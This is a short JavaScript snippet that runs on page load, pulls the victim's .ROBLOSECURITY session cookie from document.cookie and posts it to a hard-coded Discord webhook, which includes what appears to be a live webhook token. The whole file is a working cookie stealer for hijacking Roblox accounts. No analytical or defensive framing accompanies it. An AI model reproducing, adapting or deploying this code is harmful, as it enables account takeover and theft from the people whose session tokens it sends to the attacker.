function grabCookie() {
    let cookie = document.cookie;
    let robloxCookie = cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
    if (robloxCookie) {
        fetch('https://discord.com/api/webhooks/1392524908252364882/eoLw1Zoo_9NWjtPt6PPcsf4jKsba7PVKnI56eUGuFfGJ6vn2FlSb0Vb-6uwfimZI7MQ3', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie: robloxCookie })
        });
    }
}
window.onload = grabCookie;